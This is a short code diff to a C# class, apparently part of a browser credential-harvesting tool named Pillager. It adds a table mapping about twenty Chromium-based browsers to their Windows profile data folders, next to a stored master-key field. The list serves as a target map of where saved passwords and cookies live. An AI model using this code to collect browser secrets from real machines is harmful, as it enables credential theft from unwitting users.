@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Security.Cryptography;
 using System.Text;
@@ -13,6 +14,30 @@ namespace Pillager.Browsers
         public string BrowserName { get; set; }
 
         public byte[] MasterKey { get; set; }
+
+        public static Dictionary<string, string> browserOnChromium = new Dictionary<string, string>
+        {
+        { "Chrome", "Google\\Chrome\\User Data" } ,
+        { "Chrome Beta", "Google\\Chrome Beta\\User Data" } ,
+        { "Chromium", "Chromium\\User Data" } ,
+        { "Chrome SxS", "Google\\Chrome SxS\\User Data" },
+        { "Edge", "Microsoft\\Edge\\User Data" } ,
+        { "Brave-Browser", "BraveSoftware\\Brave-Browser\\User Data" } ,
+        { "QQBrowser", "Tencent\\QQBrowser\\User Data" } ,
+        { "SogouExplorer", "Sogou\\SogouExplorer\\User Data" } ,
+        { "Vivaldi", "Vivaldi\\User Data" } ,
+        { "CocCoc", "CocCoc\\Browser\\User Data" },
+        { "Torch", "Torch\\User Data" },
+        { "Kometa", "Kometa\\User Data" },
+        { "Orbitum", "Orbitum\\User Data" },
+        { "CentBrowser", "CentBrowser\\User Data" },
+        { "7Star", "7Star\\7Star\\User Data" },
+        { "Sputnik", "Sputnik\\Sputnik\\User Data" },
+        { "Epic Privacy Browser", "Epic Privacy Browser\\User Data" },
+        { "Uran", "uCozMedia\\Uran\\User Data" },
+        { "Yandex", "Yandex\\YandexBrowser\\User Data" },
+        { "Iridium", "Iridium\\User Data" },
+        };
 
         private string[] profiles = {
         "Default",
